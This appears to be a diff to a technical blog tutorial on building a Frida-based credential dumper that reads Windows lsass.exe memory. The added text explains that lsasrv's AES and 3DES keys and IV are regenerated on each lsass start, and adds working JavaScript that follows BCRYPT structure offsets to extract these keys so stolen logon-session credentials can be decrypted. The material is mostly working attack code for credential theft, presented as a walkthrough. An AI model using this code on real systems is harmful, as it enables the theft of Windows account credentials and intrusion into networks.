@@ -241,9 +241,11 @@ function getPrimaryCredentialsFromLogonSession(ptr) {
 
 Now we have the username, domain name, and credential material. We're not done yet, though. As you might have guessed from the code block above, the credential material is encrypted and is useless to us in its current format. If we want to make use of it, we're going to need to go hunting for decryption keys.
 
-## Finding the Keys
+## Keys to the Kingdom
 
-In order to be sure we can decrypt whatever credentials we have obtained from *lsasrv!LogonSessionList*, we will need to identify three variables: these are *lsasrv!hAesKey*, *lsasrv:h3DesKey* and *lsasrv!InitializationVector*. The process for obtaining these is exactly the same as for *LogonSessionList*; we need to use some predetermined signature and offset to find an instruction that dereferences them. We can reuse our function from before to do this:
+In order to be sure we can decrypt whatever credentials we have obtained from *lsasrv!LogonSessionList*, we will need to identify three variables: these are *lsasrv!hAesKey*, *lsasrv:h3DesKey* and *lsasrv!InitializationVector*. Each of these values is regenerated every time `lsass.exe` is started, so we'll need to extract them every time we want to dump credentials.
+
+The process for obtaining these variables is exactly the same as for *LogonSessionList*, We need to use some predetermined signature and offset to find an instruction that dereferences them. We can reuse our function from before to do this:
 
 ```javascript
 var lsasrv = Process.getModuleByName("lsasrv.dll")
@@ -261,3 +263,35 @@ Memory.scan(lsasrv.base, lsasrv.size, sequence, {
 	}
 });
 ```
+
+Parsing the actual keys is very simple, thankfully. The AES and 3DES keys are parsed in the exact same way, and IV literally just needs to be read from a pointer:
+
+```javascript
+function getKey(ptr) {
+	// Given a pointer to the lsasrv!hAesKey or lsasrv!h3DesKey variable, extract the actual AES/3DES key.
+	// Returns a ByteArray containing the key.
+	
+	// First, resolve the pointer to get the BCRYPT_HANDLE_KEY struct it references.
+	var bcryptHandleKey = ptr.readPointer();
+	// Next, locate the pointer to BCRYPT_KEY located at offset 0x10.
+	var bcryptKey = bcryptHandleKey.add(0x10).readPointer();
+	// Within BCRYPT_KEY, the HARD_KEY field is located at 0x38.
+	var hardKey = bcryptKey.add(0x38);
+	// The first entry in HARD_KEY is a ULONG containing the key length.
+	var len = hardKey.readULong();
+	// The second entry (at offset 0x4) is the actual key.
+	var keyBuffer = hardKey.add(0x4);
+	var key = keyBuffer.readByteArray(len);
+	return key;
+}
+
+function getAesIV(ptr) {
+	// Given a pointer to the AES IV variable, extract the actual AES key.
+	// Returns a ByteArray containing the IV.
+	return ptr.readByteArray(16);
+}
+```
+
+Now we have everything we need: the encrypted credential blobs, the AES key and associated IVs, and the 3DES key. All that's left is to pull it all together.
+
+
